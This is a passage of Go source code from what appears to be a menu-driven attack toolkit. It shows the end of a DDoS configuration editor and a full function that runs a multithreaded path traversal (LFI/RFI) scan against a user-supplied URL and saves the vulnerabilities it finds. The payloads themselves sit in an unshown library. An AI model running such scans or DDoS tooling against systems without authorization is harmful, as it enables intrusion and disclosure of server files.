		}
		return m.editDDoSConfig(config, reader)

	case "7":
		fmt.Println("✓ Done editing")
		return config

	default:
		fmt.Println("Invalid choice")
		return m.editDDoSConfig(config, reader)
	}
}

// pathTraversalAttack performs path traversal/LFI/RFI testing
func (m *Menu) pathTraversalAttack() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("\n===== Scan Path Traversal (LFI/RFI) =====")
	fmt.Println("\n[WARNING] This tool is for authorized security testing and educational purposes only.")
	fmt.Println("Unauthorized access to computer systems is illegal.")

	// Get target URL
	fmt.Print("\nEnter target URL (e.g., http://example.com/download.php): ")
	targetURL, _ := reader.ReadString('\n')
	targetURL = strings.TrimSpace(targetURL)

	if targetURL == "" {
		fmt.Println("Target URL required")
		return
	}

	// Normalize URL
	targetURL = pathtraversal.NormalizeURL(targetURL)

	// Get number of threads
	fmt.Print("Number of threads (default: 10): ")
	threadsStr, _ := reader.ReadString('\n')
	threadsStr = strings.TrimSpace(threadsStr)
	threads := 10
	if threadsStr != "" {
		if t, err := strconv.Atoi(threadsStr); err == nil && t > 0 {
			threads = t
		}
	}

	// Get timeout
	fmt.Print("Timeout in seconds (default: 10): ")
	timeoutStr, _ := reader.ReadString('\n')
	timeoutStr = strings.TrimSpace(timeoutStr)
	timeout := 10 * time.Second
	if timeoutStr != "" {
		if t, err := strconv.Atoi(timeoutStr); err == nil && t > 0 {
			timeout = time.Duration(t) * time.Second
		}
	}

	// Auto-discover parameters
	fmt.Println("\n[*] Auto-discovering parameters from URL...")
	params := pathtraversal.DiscoverParameters(targetURL)

	if len(params) == 0 {
		fmt.Println("[!] No parameters found in URL, using common parameter names")
		params = pathtraversal.CommonParameters()
	}

	fmt.Printf("[✓] Found %d parameters to test: %v\n\n", len(params), params)

	// Create config with progress callback
	lastUpdate := time.Now()
	progressMutex := sync.Mutex{}

	config := pathtraversal.PathTraversalConfig{
		TargetURL:      targetURL,
		MaxThreads:     threads,
		Timeout:        timeout,
		TestParameters: params,
		OnProgress: func(stats pathtraversal.Stats) {
			progressMutex.Lock()
			defer progressMutex.Unlock()

			// Display progress every 100ms minimum
			if time.Since(lastUpdate) > 100*time.Millisecond {
				percentage := 0
				if stats.TotalParameters > 0 {
					percentage = int((float64(stats.ParametersScanned) / float64(stats.TotalParameters)) * 100)
				}

				fmt.Printf("\r[*] Progress: %d%% | Tested: %-7d | Found: %-4d | Time: %v",
					percentage, stats.PayloadsTested, stats.VulnerabilitiesFound, stats.ElapsedTime)
				os.Stdout.Sync() // Force flush
				lastUpdate = time.Now()
			}
		},
	}

	// Create attack instance
	attack := pathtraversal.New(config)

	// Run the attack
	fmt.Println("\n[*] Starting path traversal scan...")
	fmt.Println("[*] Testing payloads for: Unix paths, Windows paths, web configs, and bypass techniques")

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	err := attack.Start(ctx)
	if err != nil {
		fmt.Printf("\n[!] Error: %v\n", err)
		return
	}

	// Get results
	results := attack.GetResults()
	stats := attack.GetStats()
	scanDuration := stats.ElapsedTime

	// Display formatted summary
	fmt.Println(pathtraversal.FormatSummary(stats, results, scanDuration))

	if len(results) > 0 {
		// Display formatted results
		fmt.Println(pathtraversal.FormatResults(results))

		// Save to file
		// Ensure data directory exists
		if err := os.MkdirAll(dataDir, 0755); err != nil {
			fmt.Printf("Warning: Failed to create data directory: %v\n", err)
		}
		outputFile := filepath.Join(dataDir, "results.txt")
		fmt.Printf("\nSaving results to %s...\n", outputFile)

		// Append to results file
		f, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			fmt.Fprintf(f, "\n===== PATH TRAVERSAL RESULTS =====\n")
			fmt.Fprintf(f, "Target: %s\n", targetURL)
			fmt.Fprintf(f, "Scan Time: %s\n", time.Now().Format(time.RFC3339))
			fmt.Fprintf(f, "Total Vulnerabilities: %d\n", len(results))
			fmt.Fprintf(f, "%s\n", pathtraversal.FormatResults(results))
			f.Close()
			fmt.Printf("[✓] Results saved to %s\n", outputFile)
		}
	} else {
		fmt.Println("[*] No vulnerabilities detected")
	}
}
